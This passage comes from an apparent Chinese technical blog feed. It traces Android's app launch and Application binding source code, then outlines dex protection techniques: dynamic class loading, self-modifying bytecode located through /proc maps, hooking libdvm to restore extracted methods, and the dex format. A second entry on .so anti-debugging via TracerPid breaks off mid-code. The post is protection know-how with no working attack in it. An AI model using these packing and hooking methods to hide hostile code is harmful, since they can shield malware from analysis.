class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public void handleMessage(Message msg) &#123;  </span><br><span class="line">           if (DEBUG_MESSAGES) Slog.v(TAG, &quot;&gt;&gt;&gt; handling: &quot; + codeToString(msg.what));  </span><br><span class="line">           switch (msg.what) &#123;  </span><br><span class="line">               case LAUNCH_ACTIVITY: &#123;  </span><br><span class="line">                   Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER, &quot;activityStart&quot;);  </span><br><span class="line">                   final ActivityClientRecord r = (ActivityClientRecord) msg.obj;  </span><br><span class="line">  </span><br><span class="line">                   r.packageInfo = getPackageInfoNoCheck(  </span><br><span class="line">                           r.activityInfo.applicationInfo, r.compatInfo);  </span><br><span class="line">                   handleLaunchActivity(r, null);  </span><br><span class="line">                   Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER);  </span><br><span class="line">               &#125; break;  </span><br><span class="line">    ...................................  </span><br><span class="line">  </span><br><span class="line">      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>16.ActivityThread.handleLaunchActivity</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">private final void handleLaunchActivity(ActivityClientRecord r, Intent customIntent) &#123;    </span><br><span class="line">       ......    </span><br><span class="line">   </span><br><span class="line">       Activity a = performLaunchActivity(r, customIntent);    </span><br><span class="line">   </span><br><span class="line">       if (a != null) &#123;    </span><br><span class="line">           r.createdConfig = new Configuration(mConfiguration);    </span><br><span class="line">           Bundle oldState = r.state;    </span><br><span class="line">           handleResumeActivity(r.token, false, r.isForward);    </span><br><span class="line">   </span><br><span class="line">           ......    </span><br><span class="line">       &#125; else &#123;    </span><br><span class="line">           ......    </span><br><span class="line">       &#125;    </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>从上面的源码可以看出，performLaunchActivity最终完成了Activity对象的创建和启动过程，并且Activity通过handleResumeActivity方法来调用被启动Activity的onResume这一生命周期方法。而onCreate这个这个生命周期方法在performLaunchActivity方法中被回调。</p><p>17.ActivityThread.performLaunchActivity</p><p>这个方法主要完成了如下几件事</p><p>1）从ActivityClientRecord中获取待启动的Activity的组件信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ActivityInfo aInfo = r.activityInfo;  </span><br><span class="line">if (r.packageInfo == null) &#123;  </span><br><span class="line">    r.packageInfo = getPackageInfo(aInfo.applicationInfo, r.compatInfo,  </span><br><span class="line">            Context.CONTEXT_INCLUDE_CODE);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">ComponentName component = r.intent.getComponent();  </span><br><span class="line">if (component == null) &#123;  </span><br><span class="line">    component = r.intent.resolveActivity(  </span><br><span class="line">        mInitialApplication.getPackageManager());  </span><br><span class="line">    r.intent.setComponent(component);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">if (r.activityInfo.targetActivity != null) &#123;  </span><br><span class="line">    component = new ComponentName(r.activityInfo.packageName,  </span><br><span class="line">            r.activityInfo.targetActivity);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2）通过Instrumenttation的newActivity方法使用类加载器创建Activity对象。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Activity activity = null;  </span><br><span class="line">try &#123;  </span><br><span class="line">    java.lang.ClassLoader cl = r.packageInfo.getClassLoader();  </span><br><span class="line">    activity = mInstrumentation.newActivity(  </span><br><span class="line">            cl, component.getClassName(), r.intent);  </span><br><span class="line">    StrictMode.incrementExpectedActivityCount(activity.getClass());  </span><br><span class="line">    r.intent.setExtrasClassLoader(cl);  </span><br><span class="line">    r.intent.prepareToEnterProcess();  </span><br><span class="line">    if (r.state != null) &#123;  </span><br><span class="line">        r.state.setClassLoader(cl);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; catch (Exception e) &#123;  </span><br><span class="line">    if (!mInstrumentation.onException(activity, e)) &#123;  </span><br><span class="line">        throw new RuntimeException(  </span><br><span class="line">            &quot;Unable to instantiate activity &quot; + component  </span><br><span class="line">            + &quot;: &quot; + e.toString(), e);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3）通过LoadeApk的makeApplication方法来尝试创建Application对象</p><p><code>Application app = r.packageInfo.makeApplication(false, mInstrumentation);</code></p><p>makeApplication方法代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">public Application makeApplication(boolean forceDefaultAppClass,  </span><br><span class="line">        Instrumentation instrumentation) &#123;  </span><br><span class="line">    if (mApplication != null) &#123;  </span><br><span class="line">        return mApplication;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    Application app = null;  </span><br><span class="line">  </span><br><span class="line">    String appClass = mApplicationInfo.className;  </span><br><span class="line">    if (forceDefaultAppClass || (appClass == null)) &#123;  </span><br><span class="line">        appClass = &quot;android.app.Application&quot;;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    try &#123;  </span><br><span class="line">        java.lang.ClassLoader cl = getClassLoader();  </span><br><span class="line">        if (!mPackageName.equals(&quot;android&quot;)) &#123;  </span><br><span class="line">            initializeJavaContextClassLoader();  </span><br><span class="line">        &#125;  </span><br><span class="line">        ContextImpl appContext = ContextImpl.createAppContext(mActivityThread, this);  </span><br><span class="line">        app = mActivityThread.mInstrumentation.newApplication(  </span><br><span class="line">                cl, appClass, appContext);  </span><br><span class="line">        appContext.setOuterContext(app);  </span><br><span class="line">    &#125; catch (Exception e) &#123;  </span><br><span class="line">        if (!mActivityThread.mInstrumentation.onException(app, e)) &#123;  </span><br><span class="line">            throw new RuntimeException(  </span><br><span class="line">                &quot;Unable to instantiate application &quot; + appClass  </span><br><span class="line">                + &quot;: &quot; + e.toString(), e);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    mActivityThread.mAllApplications.add(app);  </span><br><span class="line">    mApplication = app;  </span><br><span class="line">  </span><br><span class="line">    if (instrumentation != null) &#123;  </span><br><span class="line">        try &#123;  </span><br><span class="line">            instrumentation.callApplicationOnCreate(app);  </span><br><span class="line">        &#125; catch (Exception e) &#123;  </span><br><span class="line">            if (!instrumentation.onException(app, e)) &#123;  </span><br><span class="line">                throw new RuntimeException(  </span><br><span class="line">                    &quot;Unable to create application &quot; + app.getClass().getName()  </span><br><span class="line">                    + &quot;: &quot; + e.toString(), e);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    // Rewrite the R &apos;constants&apos; for all library apks.  </span><br><span class="line">    SparseArray&lt;String&gt; packageIdentifiers = getAssets(mActivityThread)  </span><br><span class="line">            .getAssignedPackageIdentifiers();  </span><br><span class="line">    final int N = packageIdentifiers.size();  </span><br><span class="line">    for (int i = 0; i &lt; N; i++) &#123;  </span><br><span class="line">        final int id = packageIdentifiers.keyAt(i);  </span><br><span class="line">        if (id == 0x01 || id == 0x7f) &#123;  </span><br><span class="line">            continue;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        rewriteRValues(getClassLoader(), packageIdentifiers.valueAt(i), id);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    return app;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从makeApplication方法可以看出，通过mActivityThread.mInstrumentation.newApplication创建Application对象，然后通过callApplicationOnCreate方法间接回调onCreate方法。</p><p>4）创建ContextImpl对象并通过Activity的attach方法来完成一些重要数据的初始化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Context appContext = createBaseContextForActivity(r, activity);  </span><br><span class="line">CharSequence title = r.activityInfo.loadLabel(appContext.getPackageManager());  </span><br><span class="line">Configuration config = new Configuration(mCompatConfiguration);  </span><br><span class="line">if (DEBUG_CONFIGURATION) Slog.v(TAG, &quot;Launching activity &quot;  </span><br><span class="line">    + r.activityInfo.name + &quot; with config &quot; + config);  </span><br><span class="line">activity.attach(appContext, this, getInstrumentation(), r.token,  </span><br><span class="line">    r.ident, app, r.intent, r.activityInfo, title, r.parent,  </span><br><span class="line">    r.embeddedID, r.lastNonConfigurationInstances, config,  </span><br><span class="line">    r.referrer, r.voiceInteractor);</span><br></pre></td></tr></table></figure><p>ContextImpl是一个很重要的数据结构，它是Context的具体实现，Context中的大部分逻辑都是由ContextImpl来完成的。ContextImpl是通过Activity的attach方法来和Activity建立链接的，处理之外，在attach方法中Activity还会完成Window的创建并建立自己和Window的关联，这样当Window接受到外部输入事件后就可以将时间传递给Activity。</p><p>5）调用Activity的onCreate</p><p><code>mInstrumentation.callActivityOnCreate(activity, r.state, r.persistentState);</code></p><p>最后回调Activity的onCreate方法。这也意味着应用已经启动起来了。</p><p>###总结</p><p>&emsp;&emsp;Launcher会响应图标点击，开始开启Activity，应用图标的shortcutinfo的intent获得应用信息，通知ActivityManagerServer来启动Activity，首先需要获取Activity的信息，并存放Activity信息，为启动作准备（对应ActivityRecord和Activity栈）。信息有了之后就要为应用准备一个进程，zygotefork出一个进程后，执行ActivityThread的main方法，在该方法里会先准备好Looper和消息队列，再调用attach将这个进程绑定到ActivityManagerServer，之后就要准备启动Activity了，ActivityManagerServer这时候会保存一个应用进程的代理对象，这样ActivityManagerServer就可以对Activity进行管理了，ActivityManagerServer获取Activity栈中的Activity信息，来通知应用进程创建入口Activity的实例。</p><h2 id="动态加载类"><a href="#动态加载类" class="headerlink" title="动态加载类"></a>动态加载类</h2><p>类加载器：<br><a href="http://blog.csdn.net/jiangwei0910410003/article/details/41384667" target="_blank" rel="noopener">http://blog.csdn.net/jiangwei0910410003/article/details/41384667</a></p><p>ClassLoader:<br><img src="/2018/03/09/dexprotect/15206937280365.jpg" alt=""></p><p>代码动态加载：</p><ol><li>接管系统加载，比源程序优先获取执行权利</li><li>利用ClassLoader进行源代码加载</li><li>还原程序执行环境</li><li>将执行权利移交给源程序</li></ol><h2 id="绑定Application"><a href="#绑定Application" class="headerlink" title="绑定Application"></a>绑定Application</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> at java.lang.Thread.dumpStack(Thread.java:505)</span><br><span class="line">06-21 17:42:18.448 8620-8620/cn.terminal.egame.myphone W/System.err:     at cn.terminal.egame.myphone.MyApplication.onCreate(MyApplication.java:13)</span><br><span class="line">06-21 17:42:18.448 8620-8620/cn.terminal.egame.myphone W/System.err:     at android.app.Instrumentation.callApplicationOnCreate(Instrumentation.java:1015)</span><br><span class="line">06-21 17:42:18.448 8620-8620/cn.terminal.egame.myphone W/System.err:     at android.app.ActivityThread.handleBindApplication(ActivityThread.java:4793)</span><br><span class="line">06-21 17:42:18.449 8620-8620/cn.terminal.egame.myphone W/System.err:     at android.app.ActivityThread.access$1600(ActivityThread.java:165)</span><br><span class="line">06-21 17:42:18.449 8620-8620/cn.terminal.egame.myphone W/System.err:     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1437)</span><br><span class="line">06-21 17:42:18.449 8620-8620/cn.terminal.egame.myphone W/System.err:     at android.os.Handler.dispatchMessage(Handler.java:102)</span><br><span class="line">06-21 17:42:18.449 8620-8620/cn.terminal.egame.myphone W/System.err:     at android.os.Looper.loop(Looper.java:150)</span><br><span class="line">06-21 17:42:18.449 8620-8620/cn.terminal.egame.myphone W/System.err:     at android.app.ActivityThread.main(ActivityThread.java:5621)</span><br><span class="line">06-21 17:42:18.449 8620-8620/cn.terminal.egame.myphone W/System.err:     at java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">06-21 17:42:18.449 8620-8620/cn.terminal.egame.myphone W/System.err:     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:794)</span><br><span class="line">06-21 17:42:18.449 8620-8620/cn.terminal.egame.myphone W/System.err:     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:684)</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;在ActivityThread的main方法中会执行ActivityThread对象的attach方法，回调了ActivityManagerService的远程接口本地代理对象ActivityManagerProxy的attachApplication函数通知attachApplication，并传入参数是mAppThread，这是ApplicationThread类型的Binder对象，用来接受ActivityManagerService的进程间消息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">ActivityThread</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"> ......</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">  .....</span><br><span class="line">  ActivityThread thread = <span class="keyword">new</span> ActivityThread();</span><br><span class="line">        thread.attach(<span class="keyword">false</span>);</span><br><span class="line">   .....</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">attach</span><span class="params">(<span class="keyword">boolean</span> system)</span> ｛</span></span><br><span class="line"><span class="function">   .......</span></span><br><span class="line"><span class="function">    <span class="keyword">final</span> IActivityManager mgr </span>= ActivityManagerNative.getDefault();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                mgr.attachApplication(mAppThread);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RemoteException ex) &#123;</span><br><span class="line">                <span class="comment">// Ignore</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ....</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;ActivityManagerService在接受到attachApplication函数调用远程消息之后，一系列处理之后，会有两个重要Binder通信，一个就是通过传来的参数Binder参数ApplicationThread来通知ActivityThread中mAppThread远程中调用bindApplication()，另一个是scheduleLaunchActivity。在Ams中收到attachApplication时代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">AMS</span><br><span class="line"> <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">attachApplication</span><span class="params">(IApplicationThread thread)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">            <span class="comment">//获取applicationThread的进程id(也就是淘宝应用进程)</span></span><br><span class="line">            <span class="keyword">int</span> callingPid = Binder.getCallingPid();</span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">long</span> origId = Binder.clearCallingIdentity();</span><br><span class="line">            attachApplicationLocked(thread, callingPid);</span><br><span class="line">            Binder.restoreCallingIdentity(origId);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">attachApplicationLocked</span><span class="params">(IApplicationThread thread,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">int</span> pid)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Find the application record that is being attached...  either via</span></span><br><span class="line">        <span class="comment">// the pid if we are running in multiple processes, or just pull the</span></span><br><span class="line">        <span class="comment">// next app record if we are emulating process with anonymous threads.</span></span><br><span class="line">        ProcessRecord app;</span><br><span class="line">        <span class="keyword">if</span> (pid != MY_PID &amp;&amp; pid &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (mPidsSelfLocked) &#123;</span><br><span class="line">                app = mPidsSelfLocked.get(pid);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            app = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//因为进程由AMS启动，所以在AMS中一定会有ProcessRecord（进程记录）</span></span><br><span class="line">        <span class="comment">//如果没有ProcessRecord，则需要杀死该进程并退出</span></span><br><span class="line">        <span class="keyword">if</span> (app == <span class="keyword">null</span>) &#123;</span><br><span class="line">            ```</span><br></pre></td></tr></table></figure><pre><code>    return false;}// If this application record is still attached to a previous// process, clean it up now.if (app.thread != null) {    //如果从ProcessRecord中获取的IApplicationThread不为空，则需要处理该IApplicationThread    //因为有可能此Pid为复用，旧应用进程刚释放，内部IApplicationThread尚未清空，    //同时新进程又刚好使用了此Pid    handleAppDiedLocked(app, true, true);}//创建死亡代理（进程kill后通知AMS）AppDeathRecipient adr = new AppDeathRecipient(app, pid, thread);//进程注册成功，移除超时通知mHandler.removeMessages(PROC_START_TIMEOUT_MSG, app);<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    //******绑定Application******</span><br><span class="line">    thread.bindApplication(processName, appInfo, providers, app.instrumentationClass,</span><br><span class="line">            profilerInfo, app.instrumentationArguments, app.instrumentationWatcher,</span><br><span class="line">            app.instrumentationUiAutomationConnection, testMode,</span><br><span class="line">            mBinderTransactionTrackingEnabled, enableTrackAllocation,</span><br><span class="line">            isRestrictedBackupMode || !normalMode, app.persistent,</span><br><span class="line">            new Configuration(mConfiguration), app.compat,</span><br><span class="line">            getCommonServicesLocked(app.isolated),</span><br><span class="line">            mCoreSettingsObserver.getCoreSettingsLocked());</span><br><span class="line"></span><br><span class="line">    updateLruProcessLocked(app, false, null);</span><br><span class="line">&#125; catch (Exception e) &#123;</span><br></pre></td></tr></table></figure>    //bindApplication失败后，重启进程    startProcessLocked(app, &quot;bind fail&quot;, processName);    return false;}try {    //******启动Activity(启动应用MainActivity)******    if (mStackSupervisor.attachApplicationLocked(app)) {        didSomething = true;//didSomething表示是否有启动四大组件    }} catch (Exception e) {    badApp = true;}<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">    //绑定service和Broadcast的Application</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if (badApp) &#123;</span><br><span class="line">        //如果以上组件启动出错，则需要杀死进程并移除记录</span><br><span class="line">        app.kill(&quot;error during init&quot;, true);</span><br><span class="line">        handleAppDiedLocked(app, false, true);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //如果以上没有启动任何组件，那么didSomething为false</span><br><span class="line">    if (!didSomething) &#123;</span><br><span class="line">        //调整进程的oom_adj值， oom_adj相当于一种优先级</span><br><span class="line">        //如果应用进程没有运行任何组件，那么当内存出现不足时，该进程是最先被系统“杀死”</span><br><span class="line">        updateOomAdjLocked();</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></pre><p>从上午可以看到在attachApplicationLocked中有两个比较重要的方法函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">thread.bindApplication（…） : 绑定Application到ActivityThread</span><br><span class="line">mStackSupervisor.attachApplicationLocked（app） : 启动Activity（7.0前为mMainStack.realStartActivityLocked()）</span><br></pre></td></tr></table></figure><h2 id="动态加载dex"><a href="#动态加载dex" class="headerlink" title="动态加载dex"></a>动态加载dex</h2><h3 id="外部类加载"><a href="#外部类加载" class="headerlink" title="外部类加载"></a>外部类加载</h3><p>JAVA反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能称为java语言的反射机制.  Java反射允许我们修改Android中隐藏的类,以及其中的属性。<br>Android 基于Java开发,因此具有Java拥有的一切优势.因此允许在程序运行起来后动态地加载额外的代码.而这个代码加载器,称为ClassLoader。</p><p><strong>时机</strong></p><p>ActivityThread.main()<br>ActivityThread.attach()<br>ActivityManagerSevice.attachApplication-&gt;attachApplicationLocked<br>ActivityThread.BindApplication– BIND_APPLICATION消息–&gt;handlBindApplication(内有等待java调试器挂接)<br> Application app = data.info.makeApplication(data.restrictedBackupMode, null);<br>LoadedApk.java:<br>makeApplication-&gt;newApplication<br>Application.attach-&gt;Application.attachBaseContext<br>Instrumentation.callApplicationOnCreate(app);<br>callApplicationOnCreate-&gt;Application.onCreate()</p><p>Activity类 、Service类 、Application类本质上都是Context子类<br>创建Application 对象时（而且整个App共一个Application对象），创建Service对象时，创建Activity对象时，都会创建Context实例。<br>选择attachBaseContext作为修改加载Activity的入口再合适不过了。</p><p><strong>实现步骤：</strong></p><ol><li>新建工程，完成主要代码，build之后提取dex文件（注意mulitDexEnable设置为false）</li><li>反编译dex，删除不需要的类，对应于smali文件</li><li>回编译dex，将dex放回工程目录（可对其加密处理）</li><li>工程中新建入口（即重载attachBaseContext），注意配置文件中启动Activity依然是原类名，添加启动Application类名</li></ol><h3 id="代码自修改"><a href="#代码自修改" class="headerlink" title="代码自修改"></a>代码自修改</h3><p>在源代码中写入虚假代码，载入内存后，利用先执行的native代码修改字节码实现逻辑代码修改。<br>在native代码中先获取到当前进程的内存信息（利用/proc/[pid]/maps) ,查找到dex段，搜索”dex\n035”magic值判断dex开头，利用dex文件格式获取对应方法地址，实现内存修改。</p><h3 id="函数动态还原"><a href="#函数动态还原" class="headerlink" title="函数动态还原"></a>函数动态还原</h3><p>利用外部类加载+native hook实现（对应于java层和native层的类加载部分）：</p><ol><li>抽取dex中需要加密的函数字节码，保存为文件，清空偏移</li><li>将提取字节码文件和dex文件移入工程，用以上方式加载</li><li>在native代码中，利用dexlib解析dex</li><li>利用hook框架实现对libdvm.so的dvmDefineClass</li><li>实现还原对应方法的字节码</li></ol><h3 id="dex文件格式"><a href="#dex文件格式" class="headerlink" title="dex文件格式"></a>dex文件格式</h3><p><img src="/2018/03/09/dexprotect/15211199989900.jpg" alt=""></p><p>结构图：<br><img src="/2018/03/09/dexprotect/dex.png" alt="a-c"></p><p>字符串池索引过程：<br>header.string_ids_off -&gt; string_id_list[0].string_data_off -&gt; string_item[0]|(string_item_size+byte[size])</p><p>方法字节码索引过程：<br><img src="/2018/03/09/dexprotect/AB135E84-4557-4F37-BE37-250B72DA71A4.png" alt="AB135E84-4557-4F37-BE37-250B72DA71A4"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h1 id=&quot;dex保护总结&quot;&gt;&lt;a href=&quot;#dex保护总结&quot; class=&quot;headerlink&quot; title=&quot;dex保护总结&quot;&gt;&lt;/a&gt;dex保护总结&lt;/h1&gt;&lt;h2
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>so保护总结</title>
    <link href="http://fancy-blogs.com/2018/03/07/soanti/"/>
    <id>http://fancy-blogs.com/2018/03/07/soanti/</id>
    <published>2018-03-07T10:51:39.599Z</published>
    <updated>2019-02-25T05:11:40.980Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h1 id="so保护总结"><a href="#so保护总结" class="headerlink" title="so保护总结"></a>so保护总结</h1><h2 id="so反调试"><a href="#so反调试" class="headerlink" title="so反调试"></a>so反调试</h2><h3 id="检查Tracepid"><a href="#检查Tracepid" class="headerlink" title="检查Tracepid"></a>检查Tracepid</h3><p>&emsp;&emsp;由于调试进程附加到被调试进程后，目标进程会改变进程状态，将调试进程pid设为本进程的跟踪进程，在进程信息里可查看，<code>/proc/[pid]/status</code>中的TracePid字段就是跟踪进程的pid，如果进程未被跟踪，那么该值为0。所以我们可以通过该值是否为0来判断进程是否被调试。</p><p><strong>示例代码：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readtrace</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE* fd;</span><br><span class="line">    <span class="keyword">char</span> context[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">char</span> pidname[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">int</span> 